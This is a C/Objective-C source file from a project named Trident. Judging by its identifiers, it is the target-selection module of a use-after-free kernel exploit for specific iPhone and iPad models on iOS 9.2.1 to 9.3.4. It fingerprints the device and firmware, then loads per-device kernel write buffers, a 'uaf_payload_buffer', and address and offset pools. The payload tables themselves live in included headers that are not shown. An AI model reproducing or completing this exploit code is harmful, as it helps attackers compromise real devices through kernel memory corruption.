//
//  target.c
//  Trident
//
//  Created by Simone Ferrini on 14/12/2016.
//  Copyright © 2016 Benjamin Randazzo. All rights reserved.
//

#import <UIKit/UIKit.h>
#import <sys/utsname.h> 

#include "target.h"

#include "target_iphone_5_2_ios_9_2_1.h"

#include "target_iphone_4_1_ios_9_3_1.h"

#include "target_iphone_5_2_ios_9_3_2.h"
#include "target_iphone_5_3_ios_9_3_2.h"

#include "target_ipad_2_1_ios_9_3_2.h"
#include "target_ipad_2_2_ios_9_3_2.h"
#include "target_ipad_2_3_ios_9_3_2.h"
#include "target_ipad_2_4_ios_9_3_2.h"

#include "target_ipad_3_1_ios_9_3_4.h"

uint8_t *t_clock_ops_overwrite;
uint8_t t_clock_ops_overwrite_size;

uint8_t *t_uaf_payload_buffer;
uint8_t t_uaf_payload_buffer_size;

uint32_t *t_addresses_pool;
uint32_t *t_check_offsets_pool;

static NSString *target_device(void)
{
    struct utsname info;
    uname(&info);
    return [NSString stringWithCString:info.machine encoding:NSUTF8StringEncoding];
}

static NSString *target_fw(void)
{
    return [[UIDevice currentDevice] systemVersion];
}

NSString *target_info(void)
{
    return [NSString stringWithFormat:@"%@, %@", target_fw(), target_device()];
}

boolean_t target_select(void)
{
    target_t target;
    
    NSString *info = target_info();
    if ([info isEqualToString:TARGET_IPHONE_5_2_IOS_9_2_1]) {
		target_iphone_5_2_ios_9_2_1_init(&target);
	} else if ([info isEqualToString:TARGET_IPHONE_4_1_IOS_9_3_1]) {
		target_iphone_4_1_ios_9_3_1_init(&target);
	} else if ([info isEqualToString:TARGET_IPHONE_5_2_IOS_9_3_2]) {
		target_iphone_5_2_ios_9_3_2_init(&target);
	} else if ([info isEqualToString:TARGET_IPHONE_5_3_IOS_9_3_2]) {
		target_iphone_5_3_ios_9_3_2_init(&target);
	} else if ([info isEqualToString:TARGET_IPAD_2_1_IOS_9_3_2]) {
		target_ipad_2_1_ios_9_3_2_init(&target);
	} else if ([info isEqualToString:TARGET_IPAD_2_2_IOS_9_3_2]) {
		target_ipad_2_2_ios_9_3_2_init(&target);
	} else if ([info isEqualToString:TARGET_IPAD_2_3_IOS_9_3_2]) {
		target_ipad_2_3_ios_9_3_2_init(&target);
	} else if ([info isEqualToString:TARGET_IPAD_2_4_IOS_9_3_2]) {
		target_ipad_2_4_ios_9_3_2_init(&target);
	} else if ([info isEqualToString:TARGET_IPAD_3_1_IOS_9_3_4]) {
		target_ipad_3_1_ios_9_3_4_init(&target);
    } else {
        // unsupported device
        return false;
    }
    
    t_clock_ops_overwrite = target.clock_ops_overwrite;
    t_clock_ops_overwrite_size = target.clock_ops_overwrite_size;
    t_uaf_payload_buffer = target.uaf_payload_buffer;
    t_uaf_payload_buffer_size = target.uaf_payload_buffer_size;
    t_addresses_pool = target.addresses_pool;
    t_check_offsets_pool = target.check_offsets_pool;
    
    return true;
}
